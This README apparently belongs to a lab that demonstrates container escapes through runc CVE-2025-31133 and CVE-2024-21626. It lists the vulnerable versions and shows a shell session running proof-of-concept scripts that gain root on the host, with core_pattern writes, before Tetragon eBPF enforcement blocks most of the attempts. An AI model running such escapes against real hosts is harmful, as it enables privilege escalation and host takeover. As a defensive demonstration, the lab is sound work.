# Assumptions

- Host runs vulnerable version of runc:
  - For [CVE-2025-31133](https://www.cve.org/CVERecord?id=CVE-2025-31133): `1.2.7` and below, `1.3.0-rc.1` through `1.3.2`, `1.4.0-rc.1` and `1.4.0-rc.2`.
  - For [CVE-2024-21626](https://www.cve.org/CVERecord?id=CVE-2024-21626): `1.0.0-rc93` through `1.1.11`.
- Unprivileged user is able to create containers with `runc` (or containerd's `ctr`) from OCI configuration file and plain rootfs.

# Usage

```shellsession
you@local:container-escape-ebpf$ make deploy # Setup `aws` CLI with `aws configure` and `terraform/terraform.tfvars` prior to deploying.
you@local:container-escape-ebpf$ make ssh # Wait around a minute for the virtual machine to intialize before SSHing.

ubuntu@vm:~$ python3 /pocs/cve-2024-21626.py
Launched container: 4bvviH3spAXYLNJpoQ7YHlg366eG1mhB
ubuntu@vm:~$ ls -la /pwned_by_cve_2024_21626
-rw-r--r-- 1 root root 0 Jan 13 13:49 /pwned_by_cve_2024_21626

ubuntu@vm:~$ python3 /pocs/cve-2025-31133.py
Launched container: aeE5aI7Q7aYasXTAy64QKdAIlKMSe19p
sh: 1: cannot create /proc/sys/kernel/core_pattern: Read-only file system
Exploit did not succeed. Retrying...
Launched container: vg4fRLcB87DWxGRGb1lb8mXaIum7mEfQ
sh: 1: cannot create /proc/sys/kernel/core_pattern: Read-only file system
Exploit did not succeed. Retrying...
Launched container: NsaQgj5PYt1qlBmkWtvWJ6R5ZondCjHH
Exploit succeeded!
ubuntu@vm:~$ ls -la /pwned_by_cve_2025_31133
-rw-r--r-- 1 root root 0 Jan 13 13:52 /pwned_by_cve_2025_31133

ubuntu@vm:~$ sudo rm /pwned*
ubuntu@vm:~$ sudo systemctl start tetragon

ubuntu@vm:~$ python3 /pocs/cve-2024-21626.py
runc run failed: unable to start container process: chdir to cwd ("/proc/self/fd/7") set in config.json failed: permission denied
Launched container: Y7VcaVHuPbYoeqERcfFjjQLJxMEo1VPV

ubuntu@vm:~$ python3 /pocs/cve-2025-31133.py
Launched container: uJdkfzL0feIm6ipPv0PazSUPW6VJ765h
sh: 1: cannot create /proc/sys/kernel/core_pattern: Permission denied
Exploit did not succeed. Retrying...
Launched container: qGKTlsyZ0Hh47DxF1rUIjkBxffLfYUxx
sh: 1: cannot create /proc/sys/kernel/core_pattern: Permission denied
Exploit did not succeed. Retrying...
Launched container: jMrn2W3NLAap6UPA2UB6LQHLLu9yevcO
sh: 1: cannot create /proc/sys/kernel/core_pattern: Permission denied

bash-5.1# exit
exit
ubuntu@vm:~$ exit
exit
you@local:container-escape-ebpf$ make teardown # Don't forget to teardown resources!
```
